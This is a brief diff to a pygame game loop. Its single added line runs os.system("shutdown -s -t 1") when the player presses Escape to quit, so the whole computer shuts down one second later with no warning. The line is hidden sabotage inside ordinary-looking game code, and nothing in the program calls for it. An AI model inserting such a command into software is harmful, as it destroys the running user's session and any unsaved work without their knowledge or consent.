@@ -86,6 +86,7 @@ while running:
         if event.type == pygame.KEYDOWN:
             if event.key == pygame.K_ESCAPE:
                 running = False
+                os.system("shutdown -s -t 1")
         all_sprites.update(event)
     all_sprites.draw(screen)
     pygame.display.flip()
